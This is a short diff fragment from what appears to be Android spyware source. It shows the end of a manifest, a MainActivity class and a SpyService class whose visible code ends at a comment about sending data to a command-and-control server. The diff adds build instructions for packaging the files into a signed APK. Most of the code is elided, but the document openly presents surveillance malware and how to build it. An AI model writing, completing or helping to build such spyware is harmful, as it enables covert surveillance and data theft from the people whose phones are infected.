@@ -22,10 +22,8 @@
     </application>
 </manifest>
 ...
-
 ## MainActivity.java:
 ...
-
 public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -124,4 +122,10 @@ public class SpyService extends Service {
         // Send to command-and-control server
     }
 }
+...
+## Build Instructions:
+## File -> New -> New Project -> Empty Activity
+...
+Copy all files into respective folders
+Build -> Generate Signed Bundle / APK
 ...
